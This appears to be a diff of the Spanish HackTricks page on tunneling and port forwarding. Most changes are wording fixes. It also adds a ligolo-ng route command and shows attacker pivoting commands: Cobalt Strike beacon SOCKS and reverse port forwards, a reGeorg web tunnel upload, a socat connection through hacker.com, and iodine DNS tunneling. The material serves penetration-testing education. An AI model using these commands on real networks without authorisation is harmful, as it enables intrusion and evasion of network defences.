@@ -1,4 +1,4 @@
-# Tunneling y Reenvío de Puertos
+# Túneles y Reenvío de Puertos
 
 {% hint style="success" %}
 Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -18,7 +18,7 @@ Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt=""
 ## Consejo de Nmap
 
 {% hint style="warning" %}
-**ICMP** y **SYN** escaneos no pueden ser tunelizados a través de proxies socks, así que debemos **deshabilitar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
+**ICMP** y **SYN** escaneos no pueden ser tunelizados a través de proxies socks, por lo que debemos **deshabilitar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
 {% endhint %}
 
 ## **Bash**
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Abre un puerto en el teamserver escuchando en todas las interfaces que se puede usar para **rutar el tráfico a través del beacon**.
+Abre un puerto en el teamserver escuchando en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-En este caso, el **puerto se abre en el host de beacon**, no en el Servidor del Equipo y el tráfico se envía al Servidor del Equipo y de allí al host:puerto indicado.
+En este caso, el **puerto se abre en el host de beacon**, no en el Servidor del Equipo y el tráfico se envía al Servidor del Equipo y desde allí al host:puerto indicado.
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -167,7 +167,7 @@ rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-* La reversa de puerto de Beacon está diseñada para **túnelizar tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+* La reversa de puerto de Beacon está diseñada para **túnelizar el tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
 * El tráfico está **túnelizado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
 * **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
 
@@ -184,7 +184,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Necesitas subir un archivo web de túnel: ashx|aspx|js|jsp|php|php|jsp
+Necesitas subir un archivo web túnel: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -211,7 +211,7 @@ Necesitas usar la **misma versión para el cliente y el servidor**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Usa la misma versión para el agente y el proxy**
+**Utilice la misma versión para el agente y el proxy**
 
 ### Tunneling
 ```bash
@@ -242,6 +242,12 @@ interface_list
 listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
+```
+### Acceder a los Puertos Locales del Agente
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
 ```
 ## Rpivot
 
@@ -300,8 +306,6 @@ Puedes eludir un **proxy no autenticado** ejecutando esta línea en lugar de la 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
 ### Túnel SSL Socat
 
 **/bin/sh consola**
@@ -415,7 +419,7 @@ Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Se necesita root en ambos sistemas para crear adaptadores tun y túnel de datos entre ellos utilizando consultas DNS.
+Se necesita root en ambos sistemas para crear adaptadores tun y túneles de datos entre ellos utilizando consultas DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -452,7 +456,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Cambiar DNS de proxychains
 
-Proxychains intercepta la llamada `gethostbyname` de libc y canaliza la solicitud de DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que utiliza proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un **entorno de Windows**, podrías establecer la IP del **controlador de dominio**.
+Proxychains intercepta la llamada `gethostbyname` de libc y canaliza la solicitud DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que utiliza proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un **entorno de Windows**, podrías establecer la IP del **controlador de dominio**.
 
 ## Túneles en Go
 
